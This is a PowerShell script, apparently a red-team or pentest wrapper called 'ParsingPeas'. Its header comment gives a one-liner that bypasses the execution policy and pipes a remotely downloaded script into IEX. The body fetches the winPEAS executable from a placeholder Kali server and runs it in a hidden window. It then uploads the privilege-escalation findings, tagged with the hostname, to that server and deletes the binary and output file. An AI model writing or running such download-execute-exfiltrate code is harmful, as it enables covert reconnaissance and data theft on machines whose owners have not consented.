# Inline wrapper - execute with: powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://SERVER/wrapper-inline.ps1')"
$S='KALI_SERVER_URL';$E='Stop';$ErrorActionPreference=$E;$I=$true;try{if([Console]::WindowHeight -eq 0){$I=$false}}catch{$I=$false};function W($M){if($I){Write-Host $M}else{Write-Output $M}};function C($M,$C){if($I){Write-Host $M -F $C}else{Write-Output $M}};$SI="s_$(Get-Date -F 'yyyyMMdd_HHmmss')_$PID";$H=$env:COMPUTERNAME;if(!$H){$H='u'};$T="$env:TEMP\.wp_$(Get-Date -F 'yyyyMMdd_HHmmss').tmp";C '[*] ParsingPeas' 'Cyan';C "[*] Session: $SI" 'Cyan';C "[*] Host: $H" 'Cyan';C "[*] Server: $S" 'Cyan';W '';C '[*] Downloading winpeas...' 'Yellow';try{$WC=New-Object System.Net.WebClient;$WC.DownloadFile("$S/get-winpeas","$env:TEMP\wp.exe");$WC.Dispose()}catch{C "[!] Download failed: $_" 'Red';exit 1};if(!(Test-Path "$env:TEMP\wp.exe")){C '[!] Download failed' 'Red';exit 1};C '[+] Downloaded' 'Green';C '[*] Running winpeas...' 'Yellow';W '';try{$P=New-Object Diagnostics.ProcessStartInfo;$P.FileName="$env:TEMP\wp.exe";$P.RedirectStandardOutput=$true;$P.RedirectStandardError=$true;$P.UseShellExecute=$false;$P.CreateNoWindow=$true;$Pr=New-Object Diagnostics.Process;$Pr.StartInfo=$P;$Pr.Start()|Out-Null;C "[*] Running (PID: $($Pr.Id))..." 'Yellow';$O=New-Object Text.StringBuilder;$Er=New-Object Text.StringBuilder;$OH={if($EventArgs.Data -ne $null){[void]$Event.MessageData.AppendLine($EventArgs.Data)}};$OE=Register-ObjectEvent -InputObject $Pr -EventName OutputDataReceived -Action $OH -MessageData $O;$EE=Register-ObjectEvent -InputObject $Pr -EventName ErrorDataReceived -Action $OH -MessageData $Er;$Pr.BeginOutputReadLine();$Pr.BeginErrorReadLine();$St=Get-Date;$Lu=$St;while(!$Pr.HasExited){$N=Get-Date;$El=[Math]::Round(($N-$St).TotalSeconds);if(!$I){if(($N-$Lu).TotalSeconds -ge 10){W "[*] Running... ($El sec)";$Lu=$N}}else{$M=[Math]::Floor($El/60);$Sec=$El%60;$Pc=[Math]::Min(95,[int](($El/120)*100));$Pb='['+("="*[int]($Pc/5))+(" "*(20-[int]($Pc/5)))+']';Write-Host "`r[*] Progress: $Pb $Pc% | $M`:$($Sec.ToString('00'))" -NoNewline -F Cyan};Start-Sleep -M 500};$Pr.WaitForExit();$Ex=$Pr.ExitCode;Unregister-Event -SourceIdentifier $OE.Name;Unregister-Event -SourceIdentifier $EE.Name;Remove-Job -Id $OE.Id -Force;Remove-Job -Id $EE.Id -Force;if($I){Write-Host "`r[+] Progress: [====================] 100% | Complete!" -F Green};W '';$Out=$O.ToString();$Err=$Er.ToString();$Full=$Out;if($Err){$Full+="`n`n=== STDERR ===`n"+$Err};[IO.File]::WriteAllText($T,$Full);C "[+] Complete (exit: $Ex)" 'Green'}catch{C "[!] Error: $_" 'Red';exit 1};if(!(Test-Path $T)){C '[!] No output' 'Red';exit 1};$Sz=(Get-Item $T).Length;C "[+] Size: $([Math]::Round($Sz/1KB,2)) KB" 'Green';W '';C '[*] Preparing upload...' 'Yellow';C '[*] Testing connection...' 'Yellow';try{$TC=New-Object System.Net.WebClient;$TC.DownloadString("$S/health")|Out-Null;$TC.Dispose();C '[+] Connection OK' 'Green'}catch{C '[!] Warning: Cannot reach server' 'Yellow'};C '[*] Uploading...' 'Yellow';W '';$Mr=3;$Rc=0;$Su=$false;while($Rc -lt $Mr -and !$Su){C "[*] Attempt $($Rc+1)/$Mr" 'Yellow';try{$WC=New-Object System.Net.WebClient;$WC.Headers.Add('X-Session-ID',$SI);$WC.Headers.Add('X-Hostname',$H);$WC.Headers.Add('X-Scan-Type','winpeas');$WC.Headers.Add('Content-Type','text/plain');C '[*] Reading...' 'Cyan';$Fb=[IO.File]::ReadAllBytes($T);C "[+] Read $($Fb.Length) bytes" 'Green';C "[*] Uploading to $S/upload ..." 'Cyan';$Rb=$WC.UploadData("$S/upload",'POST',$Fb);$Rt=[Text.Encoding]::UTF8.GetString($Rb);C '[+] Upload complete!' 'Green';C '[+] Success!' 'Green';try{if($Rt -match '"report_url"\s*:\s*"([^"]+)"'){$Ru=$matches[1];C "[+] Report: $S$Ru" 'Green'}}catch{};$WC.Dispose();$Su=$true}catch{$Rc++;C '[!] Failed' 'Red';C "[!] Error: $_" 'Red';if($Rc -lt $Mr){C '[*] Retry in 2s...' 'Yellow';Start-Sleep -S 2}}};W '';if($Su){C '[+] Cleaning...' 'Green';Remove-Item "$env:TEMP\wp.exe" -Force -EA SilentlyContinue;Remove-Item $T -Force -EA SilentlyContinue;C '[+] Done!' 'Green';exit 0}else{C '[!] Failed after retries' 'Red';C "[*] Output at: $T" 'Yellow';exit 1}
